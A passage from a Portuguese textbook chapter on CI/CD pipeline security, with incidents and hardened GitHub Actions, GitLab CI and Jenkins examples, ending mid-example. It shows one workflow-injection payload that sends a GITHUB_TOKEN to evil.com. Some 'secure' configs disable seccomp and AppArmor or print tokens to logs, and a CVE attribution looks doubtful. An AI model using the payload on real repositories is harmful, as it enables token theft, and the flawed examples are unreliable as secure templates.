---
layout: default
title: "09-seguranca-cicd"
---

# Capítulo 9 — Segurança de Pipelines CI/CD

CI/CD pipelines são o coração da entrega de software moderno. Elas compilam,
testam e publicam código automaticamente, com acesso direto a credenciais,
repositórios, registries e ambientes de produção. Essa centralização faz
dela um alvo de alto valor para atacantes: quem controla a pipeline controla
o fluxo completo de entrega.

Este capítulo aborda as principais ameaças a pipelines CI/CD, mostra como
proteger as plataformas mais utilizadas (GitHub Actions, GitLab CI, Jenkins),
e apresenta práticas de gerenciamento de segredos, isolamento, segurança de
artefatos e implantação segura.

---

## 9.1 Segurança de CI/CD

### 9.1.1 Por que pipelines são alvos de alto valor

Uma pipeline CI/CD típica possui:

- Acesso a repositórios de código-fonte (incluindo segredos embutidos).
- Capacidade de publicar artefatos em registries públicas ou privadas.
- Credenciais para provisionar infraestrutura e implantar em produção.
- Execução de código arbitrário (scripts, testes, builds).
- Acesso a variáveis de ambiente e segredos armazenados na plataforma.

Um atacante que compromete uma pipeline ganha acesso a tudo isso, sem
precisar furar firewalls ou explorar vulnerabilidades na aplicação final.

### 9.1.2 Superfície de ataque de uma pipeline

A superfície de ataque inclui:

| Vetor | Descrição |
|---|---|
| Repositório de código | Injeção de código malicioso via PR ou commit direto |
| Configuração da pipeline | Modificação de arquivos de workflow (`.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`) |
| Ações de terceiros | Uso de actions/bibliotecas comprometidas |
| Segredos expostos | Variáveis de ambiente logadas ou vazadas |
| Runners/agents | Comprometimento do executor da pipeline |
| Artefatos | Injeção de código malicioso em dependências ou binários |
| Webhooks | Manipulação de gatilhos para execução não autorizada |

### 9.1.3 Limites de confiança em pipelines

Pipelines CI/CD operam em múltiplos domínios de confiança:

1. **Domínio do código**: o repositório e seu histórico.
2. **Domínio da pipeline**: a configuração de build e deploy.
3. **Domínio das dependências**: pacotes externos e bibliotecas.
4. **Domínio da infraestrutura**: runners, servidores, contêineres.
5. **Domínio da produção**: ambientes de implantação.

Cada transição entre domínios é um ponto onde a confiança deve ser validada.
A falha em estabelecer limites claros de confiança permite que um atacante
atravesse domínios usando o caminho de menor resistência.

### 9.1.4 Raio de explosão de pipelines comprometidas

O impacto de uma pipeline comprometida vai muito além do repositório
individual:

- **Supply chain**: artefatos maliciosos distribuídos para milhares de usuários.
- **Dados**: acesso a segredos de produção, chaves de API, credenciais de banco.
- **Infraestrutura**: provisionamento de recursos maliciosos, cryptomining.
- **Reputação**: perda de confiança dos usuários e parceiros.
- **Financeiro**: custos de recursos cloud consumidos pelo atacante.

### 9.1.5 Casos reais documentados

Os seguintes incidentes demonstram a gravidade das ameaças a pipelines:

**Travis CI — Vazamento de variáveis de ambiente (2021)**

Em setembro de 2021, pesquisadores de segurança descobriram que o Travis CI
estava expondo variáveis de ambiente (incluindo chaves de deploy, tokens de
acesso e credenciais de serviços) para repositórios públicos. O problema
afetou mais de 770 milhões de log entries expostos. Qualquer pessoa com
acesso ao log de builds de repositórios públicos poderia extrair essas
credenciais, uma vez que elas apareciam em texto plano nos logs.

A causa raiz foi uma mudança no mecanismo de ofuscação de logs que falhou
em mascarar variáveis sensíveis em determinados cenários. O impacto incluiu
chaves SSH, tokens de deploy, credenciais de banco de dados e chaves de API
de serviços como AWS e GCP.

**Codecov — Comprometimento do bash uploader (2021)**

Em abril de 2021, o Codecov sofreu um ataque de supply chain quando um
atacante modificou o script bash uploader do Codecov para exfiltrar
variáveis de ambiente dos ambientes de CI dos clientes. O script
comprometido coletava e enviava dados para um servidor controlado pelo
atacante.

O ataque permaneceu indetectado por dois meses (de 31 de janeiro a 12 de
abril de 2021). Durante esse período, o script malicioso coletou credenciais
de mais de 29.000 repositórios que utilizavam o Codecov, incluindo ambientes
de grandes empresas. As credenciais exfiltradas incluíam chaves de API,
tokens de acesso e segredos de banco de dados.

A lição principal: dependências de supply chain, mesmo de fornecedores
conhecidos e confiáveis, podem ser comprometidas. A verificação de integridade
dos scripts baixados é essencial.

**GitHub Actions — Injeção em workflows (2021-2024)**

Múltiplos incidentes de injeção em workflows do GitHub Actions foram
documentados ao longo dos anos. Um padrão comum envolve o uso inseguro de
eventos de pull request que contêm dados controláveis pelo atacante.

Exemplo clássico de vulnerabilidade:

{% raw %}
```yaml
# INSEGURO — titulo do PR injetado no shell
on:
  pull_request:
    types: [opened]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print PR title
        run: echo "${{ github.event.pull_request.title }}"
```
{% endraw %}

Um atacante poderia abrir um PR com título contendo:

```
title": "test $(curl https://evil.com/steal?token=$GITHUB_TOKEN)"
```

Isso resultaria na execução do comando malicioso e exfiltração do token.
O correto é sempre usar interpolação de variáveis em vez de expressões
diretas em comandos shell.

**GitLab CI — Vulnerabilidades em pipelines**

Em 2022, o GitLab disclosure de CVE-2022-36046, uma vulnerabilidade que
permitia a bypass de controles de acesso em pipelines CI/CD. A falha
permitia que atacantes acessassem pipelines de outros projetos dentro da
mesma instância, potencialmente expondo segredos e artefatos.

Em 2023, outro incidente envolveu a exposição de CI/CD variables não
protegitas em pipelines públicas, onde variáveis marcadas como "masked"
ainda podiam ser acessadas por meio de técnicas de side-channel nos logs.

**JFrog Artifactory — CVEs e exposição de dados**

Em 2021, o JFrog Artifactory recebeu múltiplas CVEs críticas. A CVE-2021-27568
permitia execução remota de código (RCE) em versões específicas. A CVE-2023-25773
expunha informações sensíveis em configurações de repositório. Essas
vulnerabilidades permitiam que atacantes acessassem artefatos, credenciais
de repositórios remotos e tokens de integração.

**Jenkins — Incidentes de segurança**

O Jenkins, por ser uma das plataformas CI/CD mais utilizadas, tem sido alvo
de numerous incidents. O CVE-2024-23897 (divulgado em janeiro de 2024)
era uma vulnerabilidade de leitura arbitrária de arquivos que afetava
praticamente todas as versões do Jenkins. Com ela, atacantes não
autenticados podiam ler arquivos arbitrários no servidor do Jenkins,
incluindo configurações de credenciais.

Outro padrão recorrente envolve plugins desatualizados ou abandonados que
mantêm vulnerabilidades conhecidas, mas continuam instalados em ambientes
de produção.

---

## 9.2 Segurança do GitHub Actions

### 9.2.1 Princípio do menor privilégio em permissões

Defina permissões explícitas no nível do workflow. Nunca confie no
padrão de permissões do repositório.

```yaml
# Permissões globais restritivas
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
```

### 9.2.2 Gerenciamento do GITHUB_TOKEN

O `GITHUB_TOKEN` é fornecido automaticamente a cada execução de workflow.
Ele deve ter as permissões mínimas necessárias.

```yaml
# INSEGURO — permissões excessivas
permissions:
  contents: write
  packages: write
  actions: write
  security-events: write

# SEGURO — permissões específicas por job
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4

  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read

  deploy:
    needs: [build, test]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write  # Necessario para OIDC
    environment: production
```

### 9.2.3 Fixação de ações de terceiros

Nunca use tags mutáveis (como `v3`) para ações de terceiros. Sempre
fixe usando o SHA completo do commit.

```yaml
# INSEGURO — tag mutavel, pode ser alterada pelo mantenedor
- uses: actions/checkout@v4

# SEGURO — fixado por SHA, imutavel
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

# Tambem aceitavel — tag com hash de integridade
- uses: actions/checkout@v4 # v4.1.1
  with:
    # Verificacao adicional via hash
```

Para automatizar a verificação, use o `step-security/harden-runner`:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
```

### 9.2.4 Regras de proteção de ambiente

Use environments do GitHub para criar gate de aprovação e controle de
acesso a implantações sensíveis.

```yaml
jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - name: Deploy to staging
        run: echo "Deploying to staging"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - name: Deploy to production
        run: echo "Deploying to production"
```

Configure no GitHub:
- Branch protection rules no environment.
- Required reviewers para deploy em produção.
- Wait timer de 5 minutos para cool-down.
- Deployment branches restritas.

### 9.2.5 OIDC para autenticação cloud

GitHub Actions suporta OpenID Connect (OIDC) para autenticação sem
credenciais estáticas. Isso elimina a necessidade de armazenar
access keys longas.

```yaml
jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy
          aws-region: us-east-1

      - name: Deploy
        run: aws s3 sync ./dist s3://my-bucket
```

Configuração no AWS (IAM):

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:owner/repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

### 9.2.6 Exemplo completo: workflow seguro de build e teste

{% raw %}
```yaml
name: Build and Test

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@0.28.0
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'

      - name: Upload Trivy scan results
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'trivy-results.sarif'

  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Unit tests
        run: npm test -- --coverage

      - name: Upload coverage
        uses: actions/upload-artifact@v4
        with:
          name: coverage
          path: coverage/

  sast:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Run Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: p/default p/security-audit
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

  dependency-review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request'
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Dependency Review
        uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: GPL-3.0, AGPL-3.0
```
{% endraw %}

### 9.2.7 Exemplo completo: deploy com OIDC na AWS

```yaml
name: Deploy to AWS

on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run tests
        run: pytest tests/ -v

      - name: Build
        run: python -m build

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    environment: staging
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: dist

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/staging-deploy
          aws-region: us-east-1

      - name: Deploy to staging
        run: |
          aws s3 sync . s3://staging-bucket/
          aws cloudfront create-invalidation \
            --distribution-id ${{ secrets.STAGING_CF_DIST_ID }} \
            --paths "/*"

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    environment:
      name: production
      url: https://example.com
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - name: Download artifact
        uses: actions/download-artifact@v4
        with:
          name: dist

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/production-deploy
          aws-region: us-east-1

      - name: Deploy to production
        run: |
          aws s3 sync . s3://production-bucket/
          aws cloudfront create-invalidation \
            --distribution-id ${{ secrets.PRODUCTION_CF_DIST_ID }} \
            --paths "/*"

      - name: Notify deployment
        if: success()
        run: |
          curl -X POST "${{ secrets.SLACK_WEBHOOK }}" \
            -H "Content-Type: application/json" \
            -d '{"text":"Deploy production concluido: ${{ github.sha }}"}'
```

### 9.2.8 Exemplo completo: automação de release

```yaml
name: Release

on:
  push:
    tags:
      - 'v*'

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'

      - name: Install and build
        run: |
          npm ci
          npm run build

      - name: Run tests
        run: npm test

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist/

  publish-npm:
    needs: build
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          registry-url: 'https://registry.npmjs.org'

      - name: Publish to npm
        run: npm publish --provenance
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

  create-release:
    needs: [build, publish-npm]
    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
    steps:
      - uses: step-security/harden-runner@v2
        with:
          egress-policy: audit

      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Download build artifacts
        uses: actions/download-artifact@v4
        with:
          name: dist
          path: dist/

      - name: Generate checksums
        run: |
          cd dist
          sha256sum * > SHA256SUMS.txt

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          generate_release_notes: true
          files: |
            dist/*
            dist/SHA256SUMS.txt
```

---

## 9.3 Segurança do GitLab CI

### 9.3.1 Segurança de variáveis CI/CD

```yaml
variables:
  # Variavel publica — cuidado com o que coloca aqui
  APP_NAME: "meu-app"

  # Variavel protegida — so acessivel em branches protegidas
  # Configurar no GitLab: Settings > CI/CD > Variables
  # Marcar como: Protected = true, Masked = true
  # DEPLOY_TOKEN: "glpat-xxxxx"  # configurado no UI do GitLab

stages:
  - build
  - test
  - deploy

build:
  stage: build
  image: node:20-alpine
  script:
    - npm ci
    - npm run build
  artifacts:
    paths:
      - dist/
    expire_in: 1 hour

test:
  stage: test
  image: node:20-alpine
  script:
    - npm ci
    - npm test
  coverage: '/Lines\s*:\s*(\d+\.?\d*)%/'

deploy-staging:
  stage: deploy
  image: alpine:3.19
  script:
    - apk add --no-cache curl
    - |
      curl -X POST "$DEPLOY_WEBHOOK" \
        -H "Authorization: Bearer $DEPLOY_TOKEN" \
        -d "{\"version\": \"$CI_COMMIT_TAG\", \"env\": \"staging\"}"
  environment:
    name: staging
    url: https://staging.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == "main"

deploy-production:
  stage: deploy
  image: alpine:3.19
  script:
    - apk add --no-cache curl
    - |
      curl -X POST "$DEPLOY_WEBHOOK" \
        -H "Authorization: Bearer $DEPLOY_TOKEN" \
        -d "{\"version\": \"$CI_COMMIT_TAG\", \"env\": \"production\"}"
  environment:
    name: production
    url: https://example.com
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
  when: manual
```

### 9.3.2 Segurança de runners

```yaml
# .gitlab-ci.yml — configuracao de runner

# Usar tags para direcionar jobs para runners especificos
build:
  tags:
    - docker
    - secure
  image: node:20-alpine
  script:
    - npm ci
    - npm run build

# Runner em ambiente isolado para deploy
deploy:
  tags:
    - production-runner
    - isolated
  script:
    - ./deploy.sh
```

Configuração do runner (`/etc/gitlab-runner/config.toml`):

```toml
concurrent = 4
check_interval = 3

[[runners]]
  name = "secure-runner"
  url = "https://gitlab.example.com"
  token = "REDACTED"
  executor = "docker"

  [runners.docker]
    image = "alpine:3.19"
    privileged = false
    disable_entrypoint_overwrite = false
    oom_kill_disable = false
    disable_cache = false
    volumes = ["/cache"]
    shm_size = 0
    network_mtu = 0

  [runners.docker.security_opt]
    seccomp = "unconfined"
    apparmor = "unconfined"

  [runners.docker.sysctls]
    "net.ipv4.ip_forward" = "0"

  [runners.cache]
    Type = "s3"
    Shared = false
    [runners.cache.s3]
      BucketName = "gitlab-runner-cache"
      BucketLocation = "us-east-1"
```

### 9.3.3 Permissões de job token

O job token do GitLab permite comunicação segura entre jobs. Configure
as permissões do token no `Settings > CI/CD > Token Access`:

```yaml
# Usar CI_JOB_TOKEN para acessar outros projetos
deploy:
  script:
    - |
      curl --request POST \
        --form "token=$CI_JOB_TOKEN" \
        --form "ref=main" \
        "https://gitlab.example.com/api/v4/projects/PROJECT_ID/trigger/pipeline"

  # Acesso a registries
  services:
    - name: registry.example.com/my-image:latest
      alias: my-service

  script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
```

### 9.3.4 Exemplo completo: GitLab CI seguro

```yaml
# .gitlab-ci.yml completo com seguranca

stages:
  - security
  - build
  - test
  - package
  - deploy

variables:
  DOCKER_TLS_CERTDIR: "/certs"
  DOCKER_DRIVER: overlay2

# ============================================
# Estagio: Seguranca
# ============================================

sast:
  stage: security
  image: semgrep/semgrep:latest
  script:
    - semgrep --config=auto --sarif --output=sast-results.sarif .
  artifacts:
    reports:
      sast: gl-sast-report.json
    paths:
      - sast-results.sarif
    when: always
  allow_failure: false

dependency_scanning:
  stage: security
  image: "registry.gitlab.com/security-products/dependency-scanning:latest"
  script:
    - /analyzer run
  artifacts:
    reports:
      dependency_scanning: gl-dependency-scanning-report.json
    when: always

secret_detection:
  stage: security
  image: "registry.gitlab.com/security-products/secret-detection:latest"
  script:
    - /analyzer run
  artifacts:
    reports:
      secret_detection: gl-secret-detection-report.json
    when: always

container_scanning:
  stage: security
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    - trivy image --format json --output container-scan.json $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json
    when: always
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# ============================================
# Estagio: Build
# ============================================

build:
  stage: build
  image: node:20-alpine
  script:
    - npm ci --production=false
    - npm run build
  artifacts:
    paths:
      - dist/
      - node_modules/
    expire_in: 1 hour
  cache:
    key: ${CI_COMMIT_REF_SLUG}
    paths:
      - node_modules/

# ============================================
# Estagio: Teste
# ============================================

unit-tests:
  stage: test
  image: node:20-alpine
  script:
    - npm ci
    - npm test -- --coverage --ci
  coverage: '/Statements\s*:\s*(\d+\.?\d*)%/'
  artifacts:
    reports:
      junit: junit-results.xml
      coverage_report:
        coverage_format: cobertura
        path: coverage/cobertura-coverage.xml
    when: always

# ============================================
# Estagio: Pacote
# ============================================

docker-build:
  stage: package
  image: docker:24.0
  services:
    - docker:24.0-dind
  before_script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
  script:
    - docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .
    - docker build -t $CI_REGISTRY_IMAGE:latest .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
    - docker push $CI_REGISTRY_IMAGE:latest
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

# ============================================
# Estagio: Deploy
# ============================================

deploy-staging:
  stage: deploy
  image: alpine:3.19
  before_script:
    - apk add --no-cache curl
  script:
    - |
      curl --request POST \
        --header "PRIVATE-TOKEN: $STAGING_DEPLOY_TOKEN" \
        --data "ref=main" \
        --data "variables[DEPLOY_ENV]=staging" \
        "https://gitlab.example.com/api/v4/projects/$STAGING_PROJECT_ID/trigger/pipeline"
  environment:
    name: staging
    url: https://staging.example.com
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  resource_group: staging

deploy-production:
  stage: deploy
  image: alpine:3.19
  before_script:
    - apk add --no-cache curl
  script:
    - |
      curl --request POST \
        --header "PRIVATE-TOKEN: $PRODUCTION_DEPLOY_TOKEN" \
        --data "ref=$CI_COMMIT_TAG" \
        --data "variables[DEPLOY_ENV]=production" \
        "https://gitlab.example.com/api/v4/projects/$PRODUCTION_PROJECT_ID/trigger/pipeline"
  environment:
    name: production
    url: https://example.com
  rules:
    - if: $CI_COMMIT_TAG =~ /^v\d+\.\d+\.\d+$/
  when: manual
  resource_group: production
```

---

## 9.4 Segurança do Jenkins

### 9.4.1 Segurança de pipelines

```groovy
// Jenkinsfile seguro com pratica de menor privilegio
pipeline {
    agent {
        docker {
            image 'node:20-alpine'
            args '-v $HOME/.ssh:/tmp/.ssh:ro'
        }
    }

    options {
        timestamps()
        timeout(time: 30, unit: 'MINUTES')
        disableConcurrentBuilds()
        buildDiscarder(logRotator(numToKeepStr: '10'))
    }

    environment {
        APP_NAME = 'my-app'
        // Credenciais obtidas do Jenkins Credential Store
        NPM_TOKEN = credentials('npm-token')
        AWS_ROLE = credentials('aws-deploy-role')
    }

    stages {
        stage('Security Scan') {
            steps {
                script {
                    sh 'npm audit --audit-level=high'
                    sh 'npx semgrep --config=auto --sarif -o semgrep.sarif .'
                }
            }
        }

        stage('Build') {
            steps {
                sh 'npm ci'
                sh 'npm run build'
            }
        }

        stage('Test') {
            parallel {
                stage('Unit Tests') {
                    steps {
                        sh 'npm test -- --coverage'
                    }
                    post {
                        always {
                            junit 'test-results/**/*.xml'
                            publishHTML(target: [
                                reportName: 'Coverage',
                                reportDir: 'coverage/lcov-report',
                                reportFiles: 'index.html'
                            ])
                        }
                    }
                }

                stage('Integration Tests') {
                    steps {
                        sh 'npm run test:integration'
                    }
                }
            }
        }

        stage('Package') {
            when {
                branch 'main'
            }
            steps {
                sh 'npm pack'
                archiveArtifacts artifacts: '*.tgz', fingerprint: true
            }
        }

        stage('Deploy') {
            when {
                branch 'main'
            }
            input {
                message 'Deploy to production?'
                ok 'Deploy'
                submitter 'admin,release-team'
            }
            steps {
                script {
                    withAWS(role: "${AWS_ROLE}", roleAccount: '123456789012') {
                        sh 'aws s3 sync ./dist s3://production-bucket/'
                    }
                }
            }
        }
    }

    post {
        failure {
            script {
                emailext(
                    subject: "Build Failed: ${env.JOB_NAME} #${env.BUILD_NUMBER}",
                    body: "Build failed. Check: ${env.BUILD_URL}",
                    to: 'team@example.com'
                )
            }
        }
        cleanup {
            cleanWs()
        }
    }
}
```

### 9.4.2 Gerenciamento de credenciais

```groovy
// Acessar credenciais de forma segura
pipeline {
    agent any

    stages {
        stage('Access Credentials') {
            steps {
                // Credenciais de texto
                withCredentials([string(credentialsId: 'api-key', variable: 'API_KEY')]) {
                    sh 'curl -H "Authorization: Bearer $API_KEY" https://api.example.com/data'
                }

                // Credenciais de usuario/senha
                withCredentials([usernamePassword(
                    credentialsId: 'db-credentials',
                    usernameVariable: 'DB_USER',
                    passwordVariable: 'DB_PASS'
                )]) {
                    sh 'psql -U $DB_USER -d mydb -c "SELECT 1"'
                }

                // SSH key
                withCredentials([sshUserPrivateKey(
                    credentialsId: 'ssh-deploy-key',
                    keyFileVariable: 'SSH_KEY',
                    usernameVariable: 'SSH_USER'
                )]) {
                    sh 'ssh -i $SSH_KEY $SSH_USER@server.example.com deploy'
                }

                // Secret file
                withCredentials([file(credentialsId: 'kubeconfig', variable: 'KUBECONFIG')]) {
                    sh 'kubectl apply -f deployment.yaml'
                }
            }
        }
    }
}
```

### 9.4.3 Segurança de plugins

```groovy
// Gerenciamento seguro de plugins
// Manter no Jenkinsfile ou em pipeline auxiliar
pipeline {
    agent any

    stages {
        stage('Check Plugin Security') {
            steps {
                script {
                    // Verificar atualizacoes de seguranca dos plugins
                    sh '''
                        java -jar jenkins-cli.jar \
                            -s http://localhost:8080/ \
                            -auth admin:${JENKINS_TOKEN} \
                            list-plugins --output xml | \
                        grep -A2 "hasUpdate"
                    '''
                }
            }
        }
    }
}
```

Recomendações para plugins:
- Remova plugins não utilizados.
- Mantenha plugins atualizados.
- Use o Plugin Security Advisory do Jenkins.
- Monitore CVEs dos plugins instalados.

### 9.4.4 Segurança de agents

```groovy
// Pipeline com agent seguro
pipeline {
    agent {
        kubernetes {
            yaml """
            apiVersion: v1
            kind: Pod
            spec:
              securityContext:
                runAsNonRoot: true
                runAsUser: 1000
                fsGroup: 1000
              containers:
              - name: builder
                image: node:20-alpine
                securityContext:
                  allowPrivilegeEscalation: false
                  readOnlyRootFilesystem: true
                  capabilities:
                    drop:
                      - ALL
                resources:
                  requests:
                    memory: "512Mi"
                    cpu: "250m"
                  limits:
                    memory: "1Gi"
                    cpu: "500m"
                volumeMounts:
                - name: tmp
                  mountPath: /tmp
              volumes:
              - name: tmp
                emptyDir: {}
            """
        }
    }

    stages {
        stage('Build') {
            steps {
                sh 'npm ci && npm run build'
            }
        }
    }
}
```

---

## 9.5 Secret Management em Pipelines

### 9.5.1 GitHub Secrets

Configure secrets no GitHub: Settings > Secrets and variables > Actions.

{% raw %}
```yaml
# Uso de GitHub Secrets
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Use secrets
        env:
          API_KEY: ${{ secrets.API_KEY }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
        run: |
          echo "Using API key length: ${#API_KEY}"
          ./deploy.sh
```
{% endraw %}

Boas práticas:
- Nunca imprima secrets em logs.
- Use `add-mask` para proteger valores em logs.
- Rotacione secrets regularmente.
- Use secrets granulares por ambiente.

```yaml
# Adicionar mascara a valor em log
- name: Deploy
  run: |
    echo "::add-mask::${{ secrets.DEPLOY_TOKEN }}"
    echo "Token configurado"
    ./deploy.sh
```

### 9.5.2 GitLab Variables

```yaml
# Uso de variaveis do GitLab CI
deploy:
  script:
    - echo "Deploying with $DEPLOY_TOKEN"
    - ./deploy.sh
  # Variaveis configuradas no GitLab UI:
  # - DEPLOY_TOKEN: Protected, Masked
  # - AWS_ACCESS_KEY_ID: Protected
  # - AWS_SECRET_ACCESS_KEY: Protected, Masked
```

### 9.5.3 Integração com HashiCorp Vault

{% raw %}
```yaml
# GitHub Actions com Vault
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Import Secrets from Vault
        uses: hashicorp/vault-action@v3
        with:
          url: https://vault.example.com
          method: jwt
          role: github-actions
          secrets: |
            secret/data/myapp/api-key API_KEY | API_KEY ;
            secret/data/myapp/db-password DB_PASSWORD | DB_PASSWORD

      - name: Deploy
        env:
          API_KEY: ${{ env.API_KEY }}
          DB_PASSWORD: ${{ env.DB_PASSWORD }}
        run: ./deploy.sh
```
{% endraw %}

Configuração do Vault (Policy):

```hcl
path "secret/data/myapp/*" {
  capabilities = ["read"]
}

path "auth/jwt/login" {
  capabilities = ["create", "update"]
}
```

### 9.5.4 AWS Secrets Manager

```yaml
# GitHub Actions com AWS Secrets Manager
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
          aws-region: us-east-1

      - name: Get secrets
        run: |
          SECRET_JSON=$(aws secretsmanager get-secret-value \
            --secret-id myapp/production \
            --query SecretString --output text)
          echo "DB_PASSWORD=$(echo $SECRET_JSON | jq -r '.db_password')" >> $GITHUB_ENV
          echo "API_KEY=$(echo $SECRET_JSON | jq -r '.api_key')" >> $GITHUB_ENV

      - name: Deploy
        run: ./deploy.sh
```

### 9.5.5 Azure Key Vault

{% raw %}
```yaml
# GitHub Actions com Azure Key Vault
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Azure Login
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}

      - name: Get secrets from Key Vault
        uses: azure/get-keyvault-secrets@v1
        with:
          vault: my-keyvault
          secrets: db-password,api-key
        id: secrets

      - name: Deploy
        env:
